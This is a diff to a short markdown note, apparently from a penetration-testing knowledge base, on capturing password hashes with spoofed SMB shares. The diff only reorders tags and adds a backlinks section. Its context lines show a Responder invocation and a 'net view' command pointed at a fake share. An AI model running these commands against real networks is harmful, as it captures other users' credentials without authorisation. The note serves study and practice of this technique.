@@ -6,9 +6,9 @@ tags:
   - sniffing-and-spoofing
   - weaponization
   - client-side-attacks
+  - scenarios
   - network-protocols
   - smb
-  - scenarios
 ---
 # 01 - Capture Hashes via Spoof SMB Shares
 
@@ -23,3 +23,10 @@ $ sudo responder -I <interface> -rdwv
 ```
 C:\> net.exe view \\snare
 ```
+
+---
+## References
+
+### Backlinks
+
+- [[SMB Names Examples]]
